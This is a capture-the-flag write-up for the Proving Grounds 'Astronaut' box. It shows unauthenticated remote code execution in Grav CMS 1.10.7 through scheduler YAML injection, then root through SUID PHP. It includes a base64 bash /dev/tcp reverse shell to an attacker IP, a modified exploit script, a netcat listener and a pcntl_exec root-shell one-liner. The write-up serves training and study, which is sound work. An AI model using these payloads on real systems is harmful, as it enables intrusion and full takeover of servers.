#Linux #GravCMS #CVE #YAML #UnauthenticatedRCE #SUID #PHP #GTFOBins

## Overview

Astronaut is a Proving Grounds Linux box running Grav CMS. Grav 1.10.7 has an unauthenticated vulnerability that writes arbitrary PHP into the scheduler's YAML configuration (EDB-49973), which the scheduler executes on its next run. That gives a shell as `www-data`. Privilege escalation comes from a SUID bit set on `php7.4`, which GTFOBins covers with a one-liner to get a root shell.

## Recon

### Port Scan

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Index of /
```

The Apache directory listing reveals a single directory:

```
grav-admin/
```

### Web Enumeration

Gobuster against `/grav-admin/` maps the CMS layout:

```sh
gobuster dir -u http://192.168.229.12/grav-admin/ --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 5

/images     (Status: 301)
/home       (Status: 200)
/login      (Status: 200)
/user       (Status: 301)
/admin      (Status: 200)
/backup     (Status: 301)
```

The `/admin` endpoint is accessible and serves the Grav admin login page.

## Foothold

### GravCMS 1.10.7, Unauthenticated YAML Write / RCE (EDB-49973)

> **How this vulnerability works:** the Grav admin scheduler endpoint accepts a POST request that writes a custom job entry to the scheduler's YAML config file. The POST only validates the `admin-nonce` value, which is visible in the unauthenticated `GET /admin` page source. No session or credentials are required. The custom job's `command` field is executed by PHP on the next scheduler tick (approximately every minute), so injecting a PHP-encoded reverse shell payload fires automatically.

Build the base64-encoded reverse shell payload:

```sh
echo -ne "bash -i >& /dev/tcp/192.168.45.244/443 0>&1" | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0NC80NDMgMD4mMQ==
```

The exploit script fetches the nonce from `/grav-admin/admin`, then POSTs the scheduler job to `/grav-admin/admin/config/scheduler`. The key modifications from the stock exploit are updating the target URL from `/admin` to `/grav-admin/admin` to match this installation's subdirectory path, and replacing the base64 payload with the one generated above:

```python
target = "http://192.168.229.12"
payload = b"""/*<?php /**/
file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0NC80NDMgMD4mMQ=='));
chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
"""

r = s.get(target+"/grav-admin/admin")
adminNonce = re.search(r'admin-nonce" value="(.*)"',r.text).group(1)
...
r = s.post(target+"/grav-admin/admin/config/scheduler",data=data,headers=headers)
```

After running the script and waiting approximately 10 seconds for the scheduler:

```sh
rlwrap nc -lvnp 443
connect to [192.168.45.244] from (UNKNOWN) [192.168.229.12] 38768
www-data@gravity:~/html/grav-admin$
```

## Privilege Escalation

### SUID PHP → root

LinPEAS identifies `php7.4` with the SUID bit set. GTFOBins covers SUID PHP with a single command:

```sh
CMD="/bin/sh"
php -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami
root
```

> **Why SUID on an interpreter is dangerous:** when a binary has the SUID bit set, it runs with the file owner's privileges (here, root) regardless of who executes it. PHP's `pcntl_exec` replaces the current process image with a new one, in this case `/bin/sh`. Because PHP itself is running as root, the spawned shell inherits those privileges. The `-p` flag tells the shell to preserve the effective UID rather than resetting it to the real UID.

## Root

```sh
# cat proof.txt
‹redacted›
```

## Takeaways

- **Unauthenticated CMS scheduler injection requires only a visible nonce.** The nonce in the page source is the only "authentication" protecting this endpoint.
- **Scheduler-based payloads fire automatically.** No interaction required after submission; just wait for the next tick.
- **SUID interpreters (PHP, Python, Perl) are immediate root.** Any interpreter with SUID set can exec a shell that inherits root's effective UID.
- **Subdirectory-installed CMS instances need URL path adjustments.** Stock exploits targeting `/admin` fail silently when the app lives under `/grav-admin/admin`.
